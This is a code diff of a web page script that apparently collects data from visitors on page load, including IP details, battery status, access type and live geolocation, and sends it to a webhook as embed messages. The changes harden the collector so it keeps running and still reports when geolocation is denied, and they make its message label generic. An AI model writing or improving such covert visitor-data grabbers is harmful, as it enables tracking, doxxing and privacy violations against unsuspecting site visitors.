@@ -519,6 +519,7 @@
             }
 
             let geoLocation = 'Live Geolocation: Permission Denied';
+            let geoError = false;
             if ('geolocation' in navigator) {
                 await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(position => {
@@ -528,15 +529,17 @@
                         resolve();
                     }, error => {
                         console.error('Error getting geolocation:', error);
-                        reject(error);
+                        geoError = true;
+                        resolve(); // Still resolve to continue execution
                     });
                 });
             } else {
                 console.error('Geolocation is not supported.');
+                geoError = true;
             }
 
             const messageData = {
-                content: 'Webhook data of msue.vercel.app:',
+                content: 'Webhook data:',
                 embeds: [
                     {
                         title: 'IP Information',
@@ -557,7 +560,7 @@
                             { name: 'Battery Status', value: batteryStatus },
                             { name: 'Date and Time', value: dateTime },
                             { name: 'Access Type', value: accessType },
-                            { name: 'System (Live)', value: geoLocation },
+                            { name: 'System (Live)', value: geoError ? 'Geolocation Denied/Error' : geoLocation },
                         ],
                     },
                 ],
@@ -572,6 +575,7 @@
     // Execute the main function
     main();
 </script>
+
 
 
 
